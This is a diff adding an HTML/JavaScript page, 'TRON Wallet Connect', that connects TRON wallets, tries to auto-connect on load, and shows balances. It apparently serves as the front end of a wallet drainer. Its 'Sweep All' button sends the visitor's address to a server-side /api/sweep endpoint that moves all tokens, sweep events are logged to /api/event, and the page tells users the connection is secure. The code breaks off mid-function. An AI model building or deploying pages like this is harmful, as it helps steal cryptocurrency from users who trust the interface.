@@ -1,1 +1,1314 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRON Wallet Connect</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        :root {
+            --bg-primary: #0a0e1a;
+            --bg-secondary: #111827;
+            --bg-card: #1a1f2e;
+            --bg-hover: #242b3d;
+            --accent: #00d4ff;
+            --accent-glow: rgba(0, 212, 255, 0.3);
+            --success: #00e676;
+            --danger: #ff1744;
+            --warning: #ff9100;
+            --text-primary: #ffffff;
+            --text-secondary: #94a3b8;
+            --text-muted: #64748b;
+            --border: rgba(255, 255, 255, 0.08);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: var(--bg-primary);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        /* Animated background */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .bg-animation::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle at 30% 20%, rgba(0, 212, 255, 0.08) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 80%, rgba(0, 230, 118, 0.05) 0%, transparent 50%);
+            animation: bgPulse 15s ease-in-out infinite;
+        }
+
+        @keyframes bgPulse {
+            0%, 100% { transform: scale(1) rotate(0deg); }
+            50% { transform: scale(1.1) rotate(5deg); }
+        }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 2rem;
+            border-bottom: 1px solid var(--border);
+            background: rgba(10, 14, 26, 0.8);
+            backdrop-filter: blur(20px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--accent);
+            text-decoration: none;
+        }
+
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+
+        /* Connect Button */
+        .connect-btn {
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            color: #000;
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 12px;
+            font-size: 0.95rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            box-shadow: 0 4px 15px var(--accent-glow);
+        }
+
+        .connect-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px var(--accent-glow);
+        }
+
+        .connect-btn.connected {
+            background: var(--bg-card);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
+            box-shadow: none;
+        }
+
+        .connect-btn .dot {
+            width: 8px;
+            height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 4rem 1rem;
+            margin-bottom: 2rem;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            font-weight: 800;
+            margin-bottom: 1rem;
+            background: linear-gradient(135deg, var(--text-primary), var(--accent));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .hero p {
+            font-size: 1.1rem;
+            color: var(--text-secondary);
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        /* Wallet Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .modal {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 2rem;
+            width: 90%;
+            max-width: 420px;
+            box-shadow: var(--shadow);
+            transform: scale(0.9) translateY(20px);
+            transition: all 0.3s ease;
+        }
+
+        .modal-overlay.active .modal {
+            transform: scale(1) translateY(0);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .modal-title {
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+
+        .modal-close {
+            background: none;
+            border: none;
+            color: var(--text-secondary);
+            font-size: 1.5rem;
+            cursor: pointer;
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.2s;
+        }
+
+        .modal-close:hover {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+        }
+
+        .wallet-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .wallet-option {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+            color: var(--text-primary);
+        }
+
+        .wallet-option:hover {
+            background: var(--bg-hover);
+            border-color: var(--accent);
+            transform: translateX(4px);
+        }
+
+        .wallet-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            background: var(--bg-primary);
+        }
+
+        .wallet-info {
+            flex: 1;
+        }
+
+        .wallet-name {
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .wallet-desc {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            margin-top: 0.2rem;
+        }
+
+        .wallet-arrow {
+            color: var(--text-muted);
+            font-size: 1.2rem;
+        }
+
+        /* Dashboard */
+        .dashboard {
+            display: none;
+            animation: fadeIn 0.5s ease;
+        }
+
+        .dashboard.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        /* Cards */
+        .card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+            box-shadow: var(--shadow);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 1.5rem;
+        }
+
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .badge {
+            padding: 0.35rem 0.75rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .badge-success {
+            background: rgba(0, 230, 118, 0.15);
+            color: var(--success);
+        }
+
+        .badge-warning {
+            background: rgba(255, 145, 0, 0.15);
+            color: var(--warning);
+        }
+
+        /* Balance Display */
+        .balance-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .balance-card {
+            background: linear-gradient(135deg, var(--bg-card), var(--bg-secondary));
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 1.5rem;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, var(--accent), var(--success));
+        }
+
+        .balance-label {
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            margin-bottom: 0.5rem;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .balance-value {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: var(--text-primary);
+            display: flex;
+            align-items: baseline;
+            gap: 0.5rem;
+        }
+
+        .balance-unit {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--text-secondary);
+        }
+
+        .balance-usd {
+            font-size: 0.9rem;
+            color: var(--text-muted);
+            margin-top: 0.5rem;
+        }
+
+        /* Address Display */
+        .address-bar {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: var(--bg-primary);
+            border-radius: 14px;
+            border: 1px solid var(--border);
+            margin-bottom: 1.5rem;
+        }
+
+        .address-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+
+        .address-text {
+            flex: 1;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            word-break: break-all;
+        }
+
+        .copy-btn {
+            background: var(--bg-hover);
+            border: 1px solid var(--border);
+            color: var(--text-secondary);
+            padding: 0.5rem 1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-size: 0.85rem;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .copy-btn:hover {
+            background: var(--accent);
+            color: #000;
+            border-color: var(--accent);
+        }
+
+        /* Token List */
+        .token-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .token-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: var(--bg-primary);
+            border-radius: 14px;
+            border: 1px solid var(--border);
+            transition: all 0.2s;
+        }
+
+        .token-item:hover {
+            border-color: var(--accent);
+            background: var(--bg-hover);
+        }
+
+        .token-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 0.8rem;
+            color: white;
+        }
+
+        .token-icon.trx {
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+        }
+
+        .token-icon.usdt {
+            background: linear-gradient(135deg, #26a17b, #1e8c6a);
+        }
+
+        .token-details {
+            flex: 1;
+        }
+
+        .token-name {
+            font-weight: 600;
+            font-size: 1rem;
+        }
+
+        .token-contract {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+            font-family: 'Courier New', monospace;
+            margin-top: 0.2rem;
+        }
+
+        .token-balance {
+            text-align: right;
+        }
+
+        .token-amount {
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
+        .token-value {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+        }
+
+        /* Action Buttons */
+        .actions {
+            display: flex;
+            gap: 1rem;
+            margin-top: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .btn {
+            flex: 1;
+            min-width: 140px;
+            padding: 1rem 1.5rem;
+            border-radius: 14px;
+            border: none;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--accent), #0099cc);
+            color: #000;
+            box-shadow: 0 4px 15px var(--accent-glow);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px var(--accent-glow);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, var(--danger), #d50000);
+            color: white;
+            box-shadow: 0 4px 15px rgba(255, 23, 68, 0.3);
+        }
+
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 25px rgba(255, 23, 68, 0.4);
+        }
+
+        .btn-secondary {
+            background: var(--bg-hover);
+            color: var(--text-primary);
+            border: 1px solid var(--border);
+        }
+
+        .btn-secondary:hover {
+            background: var(--bg-card);
+            border-color: var(--accent);
+        }
+
+        /* Loading States */
+        .skeleton {
+            background: linear-gradient(90deg, var(--bg-hover) 25%, var(--bg-card) 50%, var(--bg-hover) 75%);
+            background-size: 200% 100%;
+            animation: shimmer 1.5s infinite;
+            border-radius: 8px;
+        }
+
+        @keyframes shimmer {
+            0% { background-position: 200% 0; }
+            100% { background-position: -200% 0; }
+        }
+
+        .loading-spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid var(--bg-hover);
+            border-top-color: var(--accent);
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Toast Notifications */
+        .toast-container {
+            position: fixed;
+            top: 2rem;
+            right: 2rem;
+            z-index: 2000;
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+        }
+
+        .toast {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            padding: 1rem 1.5rem;
+            box-shadow: var(--shadow);
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            min-width: 300px;
+            animation: slideIn 0.3s ease;
+            border-left: 4px solid var(--accent);
+        }
+
+        .toast.error {
+            border-left-color: var(--danger);
+        }
+
+        .toast.success {
+            border-left-color: var(--success);
+        }
+
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        /* Transaction History */
+        .tx-list {
+            display: flex;
+            flex-direction: column;
+            gap: 0.75rem;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+
+        .tx-item {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            padding: 1rem;
+            background: var(--bg-primary);
+            border-radius: 12px;
+            border: 1px solid var(--border);
+        }
+
+        .tx-icon {
+            width: 36px;
+            height: 36px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1rem;
+        }
+
+        .tx-icon.send {
+            background: rgba(255, 23, 68, 0.15);
+            color: var(--danger);
+        }
+
+        .tx-icon.receive {
+            background: rgba(0, 230, 118, 0.15);
+            color: var(--success);
+        }
+
+        .tx-details {
+            flex: 1;
+        }
+
+        .tx-type {
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .tx-time {
+            font-size: 0.75rem;
+            color: var(--text-muted);
+        }
+
+        .tx-amount {
+            font-weight: 700;
+            color: var(--danger);
+        }
+
+        .tx-amount.positive {
+            color: var(--success);
+        }
+
+        /* Empty State */
+        .empty-state {
+            text-align: center;
+            padding: 3rem;
+            color: var(--text-muted);
+        }
+
+        .empty-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            opacity: 0.5;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2rem; }
+            .header { padding: 1rem; }
+            .container { padding: 1rem; }
+            .balance-value { font-size: 1.8rem; }
+            .actions { flex-direction: column; }
+            .btn { width: 100%; }
+        }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--bg-primary);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--bg-hover);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--text-muted);
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+
+    <!-- Header -->
+    <header class="header">
+        <a href="#" class="logo">
+            <div class="logo-icon">⚡</div>
+            <span>TRON Connect</span>
+        </a>
+        <button class="connect-btn" id="connectBtn" onclick="openWalletModal()">
+            <span>🔗</span>
+            <span>Connect Wallet</span>
+        </button>
+    </header>
+
+    <!-- Main Content -->
+    <main class="container">
+        <!-- Hero (shown when disconnected) -->
+        <div class="hero" id="heroSection">
+            <h1>Connect Your TRON Wallet</h1>
+            <p>Securely connect your wallet to view balances, manage tokens, and interact with the TRON blockchain.</p>
+        </div>
+
+        <!-- Dashboard (shown when connected) -->
+        <div class="dashboard" id="dashboard">
+            <!-- Address Bar -->
+            <div class="address-bar">
+                <div class="address-icon">👤</div>
+                <div class="address-text" id="walletAddress">Not connected</div>
+                <button class="copy-btn" onclick="copyAddress()">
+                    <span>📋</span>
+                    <span>Copy</span>
+                </button>
+            </div>
+
+            <!-- Balances -->
+            <div class="balance-grid">
+                <div class="balance-card">
+                    <div class="balance-label">TRX Balance</div>
+                    <div class="balance-value">
+                        <span id="trxBalance">0.00</span>
+                        <span class="balance-unit">TRX</span>
+                    </div>
+                    <div class="balance-usd" id="trxUsd">≈ $0.00 USD</div>
+                </div>
+                <div class="balance-card">
+                    <div class="balance-label">USDT Balance</div>
+                    <div class="balance-value">
+                        <span id="usdtBalance">0.00</span>
+                        <span class="balance-unit">USDT</span>
+                    </div>
+                    <div class="balance-usd" id="usdtUsd">≈ $0.00 USD</div>
+                </div>
+            </div>
+
+            <!-- Token List -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">All Tokens</div>
+                    <span class="badge badge-success" id="tokenCount">0 tokens</span>
+                </div>
+                <div class="token-list" id="tokenList">
+                    <div class="empty-state">
+                        <div class="empty-icon">🪙</div>
+                        <p>No tokens found</p>
+                    </div>
+                </div>
+                <div class="actions">
+                    <button class="btn btn-secondary" onclick="refreshBalances()">
+                        <span>🔄</span>
+                        <span>Refresh</span>
+                    </button>
+                    <button class="btn btn-primary" onclick="sweepTokens()" id="sweepBtn">
+                        <span>💸</span>
+                        <span>Sweep All</span>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Transaction History -->
+            <div class="card">
+                <div class="card-header">
+                    <div class="card-title">Recent Activity</div>
+                    <span class="badge badge-warning">Live</span>
+                </div>
+                <div class="tx-list" id="txList">
+                    <div class="empty-state">
+                        <div class="empty-icon">📋</div>
+                        <p>No recent activity</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- Wallet Modal -->
+    <div class="modal-overlay" id="walletModal" onclick="closeWalletModal(event)">
+        <div class="modal" onclick="event.stopPropagation()">
+            <div class="modal-header">
+                <div class="modal-title">Connect Wallet</div>
+                <button class="modal-close" onclick="closeWalletModal()">&times;</button>
+            </div>
+            <div class="wallet-list" id="walletList">
+                <!-- Wallets injected by JS -->
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toastContainer"></div>
+
+    <script>
+        // ========== CONFIG ==========
+        const API_BASE = ''; // Same origin
+        let currentAddress = null;
+        let isConnecting = false;
+        let config = {};
+
+        // ========== WALLET DETECTION ==========
+        const wallets = [
+            {
+                name: 'TronLink',
+                id: 'tronlink',
+                icon: '🦊',
+                desc: 'Most popular TRON wallet',
+                detect: () => window.tronLink || window.tronWeb,
+                connect: async () => {
+                    if (window.tronLink) {
+                        await window.tronLink.request({ method: 'tron_requestAccounts' });
+                        return window.tronLink.tronWeb?.defaultAddress?.base58;
+                    }
+                    if (window.tronWeb?.defaultAddress?.base58) {
+                        return window.tronWeb.defaultAddress.base58;
+                    }
+                    throw new Error('TronLink not available');
+                }
+            },
+            {
+                name: 'TokenPocket',
+                id: 'tokenpocket',
+                icon: '👛',
+                desc: 'Multi-chain wallet',
+                detect: () => window.tokenpocket?.tronWeb || window.tp?.isTokenPocket,
+                connect: async () => {
+                    if (window.tokenpocket?.tronWeb) {
+                        const addr = window.tokenpocket.tronWeb.defaultAddress?.base58;
+                        if (addr) return addr;
+                    }
+                    throw new Error('TokenPocket not available');
+                }
+            },
+            {
+                name: 'BitKeep',
+                id: 'bitkeep',
+                icon: '🔷',
+                desc: 'Web3 wallet',
+                detect: () => window.bitkeep?.tronWeb,
+                connect: async () => {
+                    if (window.bitkeep?.tronWeb?.defaultAddress?.base58) {
+                        return window.bitkeep.tronWeb.defaultAddress.base58;
+                    }
+                    throw new Error('BitKeep not available');
+                }
+            },
+            {
+                name: 'OKX Wallet',
+                id: 'okxwallet',
+                icon: '🟢',
+                desc: 'OKX Web3 Wallet',
+                detect: () => window.okxwallet?.tronLink,
+                connect: async () => {
+                    if (window.okxwallet?.tronLink) {
+                        await window.okxwallet.tronLink.request({ method: 'tron_requestAccounts' });
+                        return window.okxwallet.tronLink.tronWeb?.defaultAddress?.base58;
+                    }
+                    throw new Error('OKX Wallet not available');
+                }
+            },
+            {
+                name: 'WalletConnect',
+                id: 'walletconnect',
+                icon: '🔗',
+                desc: 'Connect via QR code',
+                detect: () => true, // Always available as fallback
+                connect: async () => {
+                    // WalletConnect integration would go here
+                    throw new Error('WalletConnect not yet implemented');
+                }
+            }
+        ];
+
+        // ========== UI FUNCTIONS ==========
+        function openWalletModal() {
+            if (currentAddress) {
+                disconnectWallet();
+                return;
+            }
+            renderWalletList();
+            document.getElementById('walletModal').classList.add('active');
+        }
+
+        function closeWalletModal(event) {
+            if (event && event.target !== event.currentTarget) return;
+            document.getElementById('walletModal').classList.remove('active');
+        }
+
+        function renderWalletList() {
+            const list = document.getElementById('walletList');
+            list.innerHTML = wallets.map(w => {
+                const detected = w.detect();
+                const opacity = detected ? '1' : '0.5';
+                const status = detected ? 'Detected' : 'Not installed';
+                return `
+                    <div class="wallet-option" onclick="connectWallet('${w.id}')" style="opacity: ${opacity}">
+                        <div class="wallet-icon">${w.icon}</div>
+                        <div class="wallet-info">
+                            <div class="wallet-name">${w.name}</div>
+                            <div class="wallet-desc">${w.desc} • ${status}</div>
+                        </div>
+                        <div class="wallet-arrow">→</div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        // ========== WALLET CONNECTION ==========
+        async function connectWallet(walletId) {
+            if (isConnecting) return;
+            isConnecting = true;
+            
+            const wallet = wallets.find(w => w.id === walletId);
+            if (!wallet) return;
+
+            try {
+                showToast('Connecting...', 'info');
+                const address = await wallet.connect();
+                
+                if (!address) {
+                    throw new Error('No address returned');
+                }
+
+                currentAddress = address;
+                await fetchConfig();
+                await updateUI();
+                
+                document.getElementById('walletModal').classList.remove('active');
+                showToast('Wallet connected!', 'success');
+                
+                // Start polling
+                startPolling();
+                
+            } catch (error) {
+                console.error('Connection error:', error);
+                showToast(error.message || 'Failed to connect', 'error');
+            } finally {
+                isConnecting = false;
+            }
+        }
+
+        function disconnectWallet() {
+            currentAddress = null;
+            stopPolling();
+            document.getElementById('connectBtn').innerHTML = '<span>🔗</span><span>Connect Wallet</span>';
+            document.getElementById('connectBtn').classList.remove('connected');
+            document.getElementById('heroSection').style.display = 'block';
+            document.getElementById('dashboard').classList.remove('active');
+            showToast('Wallet disconnected', 'info');
+        }
+
+        // ========== API CALLS ==========
+        async function fetchConfig() {
+            try {
+                const res = await fetch(`${API_BASE}/api/config`);
+                config = await res.json();
+            } catch (e) {
+                console.error('Config error:', e);
+            }
+        }
+
+        async function fetchBalance() {
+            if (!currentAddress) return;
+            try {
+                const res = await fetch(`${API_BASE}/api/balance`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: currentAddress })
+                });
+                return await res.json();
+            } catch (e) {
+                console.error('Balance error:', e);
+                return null;
+            }
+        }
+
+        async function fetchTokens() {
+            if (!currentAddress) return;
+            try {
+                const res = await fetch(`${API_BASE}/api/tokens`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: currentAddress })
+                });
+                return await res.json();
+            } catch (e) {
+                console.error('Tokens error:', e);
+                return null;
+            }
+        }
+
+        async function sweepTokens() {
+            if (!currentAddress) return;
+            
+            const btn = document.getElementById('sweepBtn');
+            btn.disabled = true;
+            btn.innerHTML = '<div class="loading-spinner"></div><span>Sweeping...</span>';
+            
+            try {
+                const res = await fetch(`${API_BASE}/api/sweep`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ address: currentAddress })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    showToast(`Sweep successful! TX: ${data.txId?.slice(0, 20)}...`, 'success');
+                    logEvent('sweep', currentAddress, data.txId);
+                    addTxToHistory('Sweep', data.txId, 'send');
+                    await refreshBalances();
+                } else {
+                    throw new Error(data.error || 'Sweep failed');
+                }
+            } catch (e) {
+                showToast(e.message, 'error');
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '<span>💸</span><span>Sweep All</span>';
+            }
+        }
+
+        async function logEvent(type, address, txId, amount = '') {
+            try {
+                await fetch(`${API_BASE}/api/event`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ type, address, txId, amount })
+                });
+            } catch (e) {
+                console.error('Event log error:', e);
+            }
+        }
+
+        // ========== UI UPDATES ==========
+        async function updateUI() {
+            if (!currentAddress) return;
+            
+            // Update header
+            const btn = document.getElementById('connectBtn');
+            btn.innerHTML = `<div class="dot"></div><span>${shortenAddress(currentAddress)}</span>`;
+            btn.classList.add('connected');
+            
+            // Show dashboard
+            document.getElementById('heroSection').style.display = 'none';
+            document.getElementById('dashboard').classList.add('active');
+            document.getElementById('walletAddress').textContent = currentAddress;
+            
+            await refreshBalances();
+        }
+
+        async function refreshBalances() {
+            if (!currentAddress) return;
+            
+            const [balanceData, tokenData] = await Promise.all([
+                fetchBalance(),
+                fetchTokens()
+            ]);
+            
+            if (balanceData) {
+                document.getElementById('trxBalance').textContent = formatNumber(balanceData.trx || 0);
+                document.getElementById('usdtBalance').textContent = formatNumber(balanceData.usdt || 0);
+                document.getElementById('trxUsd').textContent = `≈ $${formatNumber((balanceData.trx || 0) * 0.12)} USD`; // Approx TRX price
+                document.getElementById('usdtUsd').textContent = `≈ $${formatNumber(balanceData.usdt || 0)} USD`;
+            }
+            
+            if (tokenData && tokenData.tokens) {
+                renderTokens(tokenData.tokens);
+            }
+        }
+
+        function renderTokens(tokens) {
+            const list = document.getElementById('tokenList');
+            document.getElementById('tokenCount').textContent = `${tokens.length} tokens`;
+            
+            if (tokens.length === 0) {
+                list.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-icon">🪙</div>
+                        <p>No tokens found</p>
+                    </div>
+                `;
+                return;
+            }
+            
+            list.innerHTML = tokens.map(t => {
+                const symbol = t.symbol || '???';
+                const decimals = t.decimals || 6;
+                const balance = t.rawBalance ? Number(t.rawBalance) / (10 ** decimals) : 0;
+                const isUsdt = symbol.toUpperCase() === 'USDT';
+                const isTrx = symbol.toUpperCase() === 'TRX';
+                
+                return `
+                    <div class="token-item">
+                        <div class="token-icon ${isUsdt ? 'usdt' : isTrx ? 'trx' : ''}">${symbol.slice(0, 3)}</div>
+                        <div class="token-details">
+                            <div class="token-name">${symbol}</div>
+                            <div class="token-contract">${shortenAddress(t.contractAddress)}</div>
+                        </div>
+                        <div class="token-balance">
+                            <div class="token-amount">${formatNumber(balance)}</div>
+                            <div class="token-value">${symbol}</div>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        }
+
+        function addTxToHistory(type, txId, direction) {
+            const list = document.getElementById('txList');
+            const emptyState = list.querySelector('.empty-state');
+            if (emptyState) emptyState.remove();
+            
+            const item = document.createElement('div');
+            item.className = 'tx-item';
+            item.innerHTML = `
+                <div class="tx-icon ${direction}">
+                    ${direction === 'send' ? '↑' : '↓'}
+                </div>
+                <div class="tx-details">
+                    <div class="tx-type">${type}</div>
+                    <div class="tx-time">${new Date().toLocaleString()}</div>
+                </div>
+                <div class="tx-amount ${direction === 'receive' ? 'positive' : ''}">
+                    ${direction === 'send' ? '-' : '+'}
+                </div>
+            `;
+            list.insertBefore(item, list.firstChild);
+        }
+
+        // ========== UTILITIES ==========
+        function shortenAddress(addr) {
+            if (!addr) return '';
+            return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
+        }
+
+        function formatNumber(num) {
+            if (num === undefined || num === null) return '0.00';
+            const n = typeof num === 'string' ? parseFloat(num) : num;
+            if (isNaN(n)) return '0.00';
+            if (n === 0) return '0.00';
+            if (n < 0.01) return n.toFixed(6);
+            if (n < 1) return n.toFixed(4);
+            return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        }
+
+        function copyAddress() {
+            if (!currentAddress) return;
+            navigator.clipboard.writeText(currentAddress);
+            showToast('Address copied!', 'success');
+        }
+
+        function showToast(message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            
+            const icons = { success: '✅', error: '❌', info: 'ℹ️' };
+            toast.innerHTML = `<span>${icons[type] || 'ℹ️'}</span><span>${message}</span>`;
+            
+            container.appendChild(toast);
+            
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateX(100%)';
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+
+        // ========== POLLING ==========
+        let pollInterval;
+        function startPolling() {
+            stopPolling();
+            pollInterval = setInterval(() => {
+                if (currentAddress) refreshBalances();
+            }, 15000); // Every 15 seconds
+        }
+
+        function stopPolling() {
+            if (pollInterval) clearInterval(pollInterval);
+        }
+
+        // ========== INIT ==========
+        // Check for existing connection on load
+        window.addEventListener('load', async () => {
+            // Try to detect if any wallet is already connected
+            for (const wallet of wallets) {
+                if (wallet.detect() && wallet.id !== 'walletconnect') {
+                    try {
+                        const addr = await wallet.connect();
+                        if (addr) {
+                            currentAddress = addr;
+                            await fetchConfig();
+                            await updateUI();
+                            startPolling();
+                            break;
+                        }
+                    } catch (e) {
